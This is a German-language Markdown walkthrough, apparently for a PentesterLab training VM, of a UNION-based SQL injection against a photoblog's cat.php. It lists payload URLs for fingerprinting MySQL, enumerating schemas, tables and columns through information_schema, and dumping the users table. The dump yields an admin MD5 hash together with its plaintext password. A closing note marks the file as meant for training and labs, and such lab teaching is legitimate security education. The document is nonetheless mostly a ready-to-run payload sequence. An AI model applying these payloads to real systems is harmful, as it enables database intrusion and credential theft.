# SQL Injection to Shell – Exploitation Walkthrough

Dieses Dokument beschreibt einen vollständigen SQL-Injection-Angriff mit dem Ziel, Informationen aus der Datenbank zu extrahieren und Zugangsdaten zu erlangen. Die genutzte Zielanwendung basiert auf einer MySQL-Datenbank.

## 📌 Kontext

- **MySQL-Version:** 5.1.63-0+squeeze1  
- **Datenbank:** photoblog  
- **Benutzer:** pentesterlab@localhost  
- **Datenverzeichnis:** /var/lib/mysql/  

Ziel der folgenden Schritte ist es, über SQL Injection Zugriff auf sensible Daten zu erlangen, die zur weiteren Kompromittierung des Systems verwendet werden können.

---

## 🔍 Erste Tests

### Basistest
`http:`
```http://192.168.1.142/cat.php?id=2 UNION SELECT 1,2,3,4 --+```

### Version Anzeigen
`http:`
```http://192.168.1.142/cat.php?id=2 UNION SELECT 1,version(),3,4 --+```

### Aktive Datenbank anzeigen
`http`
```http://192.168.1.142/cat.php?id=2 UNION SELECT 1,database(),3,4 --+```

### Benutzer anlegen
`http`
```http://192.168.1.142/cat.php?id=2 UNION SELECT 1,user(),3,4 --+```

--- 

## 📂 Datenbankaufbau erkunden

### Datenbanken auflisten

`sql`
```UNION SELECT 1,group_concat(schema_name),3,4 FROM information_schema.schemata```

**Ergebnis Beispiel:**
- information_schema
- photoblog

**Ziel-Datenbank: Beispiel:**
- photoblog

### Tabellen in der photoblog-Datenbank

`sql`
```UNION SELECT 1,group_concat(table_name),3,4 FROM information_schema.tables WHERE table_schema=database()```

**Ergebnis Beispiel:**
- categories
- pictures
- users

### Spalten der Tabelle `users`

`sql`
```UNION SELECT 1,group_concat(column_name),3,4 FROM information_schema.columns WHERE table_name=0x7573657273```

***HINWEIS:*** 
0x7573657273 ist Hexadezimal aus dem Wort users

**Ergebnis Beispiel:**
- id
- login
- password

---

## 🔓 Benutzeranmeldeinformationen extrahieren

`http`
```http://192.168.1.142/cat.php?id=2 UNION SELECT 1,group_concat(id,0x3a3a,login,0x3a3a,password),3,4 FROM users```

**Ergebnis (entschlüsselt):** **Beispiel**
`cpp`
```1::admin::8efe310f9ab3efeae8d410a8e0166eb2```

**Anmeldeinformationen:** **Beispiel**
-Benutzername: admin
-Passwort-Hash (MD5): 8efe310f9ab3efeae8d410a8e0166eb2
- Klartext-Passwort: P4ssw0rd

---

**Hinweis:** Diese Datei ist rein für Schulungszwecke und Laborszenarien gedacht.
Siehe auch den [⚠️ Disclaimer in der README](/README.md#️-disclaimer).
